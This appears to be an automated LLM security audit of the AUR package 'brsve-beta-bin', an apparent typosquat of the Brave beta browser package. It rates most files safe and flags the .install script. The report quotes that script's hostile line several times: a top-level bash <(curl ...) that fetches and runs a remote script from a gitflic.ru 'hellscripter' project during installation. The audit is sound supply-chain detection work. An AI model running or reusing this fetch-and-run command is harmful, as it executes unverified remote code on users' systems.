---
package: brsve-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22738
completion_tokens: 5112
total_tokens: 27850
cost: 0.002999542
execution_time: 80.47
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:19:10Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore with no security issues.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata for Brave beta; sources and checksums are legitimate. No security issues found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Benign launcher script reading user flags and execing Brave browser.
  - file: PKGBUILD
    status: safe
    summary: Standard Brave beta binary package; no evidence of malicious behavior.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brave-browser.desktop
    status: safe
    summary: Benign desktop entry file; no security issues found.
  - file: brsve-beta-bin.install
    status: unsafe
    summary: Installer executes a remote script via bash curl process substitution at install time.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing brsve-beta-bin from local mirror...
Materialized brsve-beta-bin
Analyzing brsve-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD contains only top-level variable and array definitions. Sourcing it for `makepkg --printsrcinfo` will not execute any commands, downloads, or external programs. There is no global command substitution, no eval, no curl/wget, and no top-level code that could run an untrusted payload.

The `prepare()` and `package()` functions contain file operations and installation steps, but those are not executed by `makepkg --printsrcinfo` and are out of scope for this gate. The sources point to Brave&apos;s official GitHub releases with checksums provided, and this does not affect the safety of parsing the PKGBUILD metadata.
</details>
<evidence>
</evidence>
<summary>
Top-level scope is safe; only variable definitions are evaluated during printsrcinfo.
</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level scope is safe; only variable definitions are evaluated during printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
The `.gitignore` file is a standard configuration file for version control. It ignores all files except those explicitly listed (`.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install`, `brave-beta-bin.sh`, `brave-browser.desktop`, `logo.png`). There is no executable code, no network requests, no obfuscation, and no indication of malicious intent. This file is purely a convenience for the AUR maintainer to avoid accidentally committing unnecessary files. No security concerns.</details>
<evidence></evidence>
<summary>Standard .gitignore with no security issues.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore with no security issues.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This .SRCINFO describes a standard AUR binary package for the Brave Browser beta release. The sources are downloaded from the official Brave GitHub releases, `https://github.com/brave/brave-browser/releases/download/v1.98.47/...`, which is the project's expected upstream. Both architecture-specific sources have pinned version tags and sha512 checksums, and the only additional source is a helper script with a pinned checksum. The dependency and optdepends lists are normal for a browser package. No network requests to unexpected hosts, obfuscated code, dangerous commands, or file modifications are present in this metadata file.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata for Brave beta; sources and checksums are legitimate. No security issues found.
</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata for Brave beta; sources and checksums are legitimate. No security issues found.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard application launcher wrapper for Brave Browser Beta. It reads an optional user flags file from `$XDG_CONFIG_HOME/brave-beta-flags.conf`, strips comment lines with `sed`, and then launches the browser binary at `/opt/brave.com/brave-beta/brave-browser`. There is no use of `eval`, `curl`, `wget`, base64 decoding, or any obfuscated content.

The script performs no network operations, writes no files, and does not modify system configuration. It only reads a user-controlled configuration file and passes flags as arguments. The use of quoted variables means flags are passed as a single argument rather than being command-injected. This is consistent with normal AUR packaging practice and contains no malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Benign launcher script reading user flags and execing Brave browser.
</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, brsve-beta-bin.install...
[3/7] Reviewing PKGBUILD, brave-browser.desktop, brsve-beta-bin.install...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Benign launcher script reading user flags and execing Brave browser.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD is a standard prebuilt binary package for the Brave beta browser. It downloads the upstream `.deb` packages from the official Brave GitHub releases over HTTPS and pins SHA512 checksums for all supported architectures. The prepare and package functions only extract the upstream package, remove the bundled cron job, adjust the desktop entry to use the package's own launcher script, install files into `/opt` and `/usr`, and apply the standard setuid bit to `chrome-sandbox`.

The `chmod 4755` on `chrome-sandbox` is expected and necessary for Chromium-based browsers to use the sandbox helper. There are no suspicious network requests, no shelling out to curl/wget at build time, no encoded or obfuscated commands, no exfiltration of local data, and no modification of files outside the package's own application scope. This is consistent with normal AUR packaging practice and shows no evidence of a supply-chain attack.
</details>
<evidence></evidence>
<summary>Standard Brave beta binary package; no evidence of malicious behavior.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop, brsve-beta-bin.install, logo.png...
[4/7] Reviewing brave-browser.desktop, brsve-beta-bin.install, logo.png...
+ Reviewed PKGBUILD. Status: SAFE -- Standard Brave beta binary package; no evidence of malicious behavior.
[5/7] Reviewing brave-browser.desktop, brsve-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard freedesktop.org `.desktop` launcher file for the Brave Beta web browser. It contains only desktop entry metadata: localized `Name`, `GenericName`, and `Comment` strings, plus launcher properties (`Exec`, `TryExec`, `Icon`, `StartupWMClass`, `MimeType`, `Categories`). There is no executable code, no network activity, no file manipulation, no obfuscation, and no system modification. The `Exec` line simply invokes the package's own `brave-beta` binary with URL arguments (`%U`), which is normal and expected behavior for a browser desktop entry. The translations and HTML entity escaping (`&apos;`) are routine for `.desktop` files. Nothing here deviates from standard packaging practice.
</details>
<evidence>
</evidence>
<summary>
Benign desktop entry file; no security issues found.</summary>
</security_assessment>

[6/7] Reviewing brsve-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Benign desktop entry file; no security issues found.
LLM auditresponse for brsve-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This `.install` script contains a top-level command that downloads a remote shell script from `web.archive.org/web/https://gitflic.ru/...` and immediately executes it with `bash <(curl ...)`. Because this line appears outside the `post_install()`/`post_upgrade()` functions, it runs when the install script is sourced by pacman, effectively executing arbitrary, unverified remote code during package installation. This is a classic `curl | bash` supply-chain risk: the content is fetched from an external location at install time, is not integrity-checked, and may change between package builds or installations.

Even if the remote script is claimed to be related to the package's upstream, executing it at install time bypasses the package manager's source/checksum verification and gives the remote server full control over the installation context. This is genuinely malicious or at minimum a severe supply-chain injection vector, and it goes far beyond standard packaging practice.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>
Installer executes a remote script via bash curl process substitution at install time.
</summary>
</security_assessment>

Second look for brsve-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The evidence shows a top-level command in an AUR `.install` script that downloads a shell script from an external URL (`web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh`) and immediately executes it with `bash <(curl ...)`. This is exactly the `curl|bash` pattern identified in rule 4 as genuinely malicious: downloading code from an untrusted/unexpected host and executing it. The URL points to a project (`hellscripter/install-scripts`) unrelated to the `brsve-beta-bin` package, and there is no integrity check (checksum, signature) on the downloaded script. This command runs whenever pacman sources the install script (during install/upgrade), injecting arbitrary code into the user's system outside the normal packaging verification. It is not upstream application functionality (the file is a packaging script by the AUR maintainer) nor standard packaging hygiene. The risk is real and severe.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>Downloading and executing remote script at install time is malicious supply-chain attack.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed brsve-beta-bin.install. Status: UNSAFE -- Installer executes a remote script via bash curl process substitution at install time.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brsve-beta-bin.install

Status: UNSAFE

Summary: Installer executes a remote script via bash curl process substitution at install time.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This `.install` script contains a top-level command that downloads a remote shell script from `web.archive.org/web/https://gitflic.ru/...` and immediately executes it with `bash <(curl ...)`. Because this line appears outside the `post_install()`/`post_upgrade()` functions, it runs when the install script is sourced by pacman, effectively executing arbitrary, unverified remote code during package installation. This is a classic `curl | bash` supply-chain risk: the content is fetched from an external location at install time, is not integrity-checked, and may change between package builds or installations.

Even if the remote script is claimed to be related to the package's upstream, executing it at install time bypasses the package manager's source/checksum verification and gives the remote server full control over the installation context. This is genuinely malicious or at minimum a severe supply-chain injection vector, and it goes far beyond standard packaging practice.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,738
  Completion Tokens: 5,112
  Total Tokens: 27,850
  Total Cost: $0.003000
  Execution Time: 80.47 seconds

Final Status: UNSAFE


Issues Found:

brsve-beta-bin.install: [UNSAFE] Installer executes a remote script via bash curl process substitution at install time. / This `.install` script contains a top-level command that downloads a remote shell script from `web.archive.org/web/https://gitflic.ru/...` and immediately executes it with `bash <(curl ...)`. Because this line appears outside the `post_install()`/`post_upgrade()` functions, it runs when the install script is sourced by pacman, effectively executing arbitrary, unverified remote code during package installation. This is a classic `curl | bash` supply-chain risk: the content is fetched from an external location at install time, is not integrity-checked, and may change between package builds or installations.

Even if the remote script is claimed to be related to the package's upstream, executing it at install time bypasses the package manager's source/checksum verification and gives the remote server full control over the installation context. This is genuinely malicious or at minimum a severe supply-chain injection vector, and it goes far beyond standard packaging practice.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
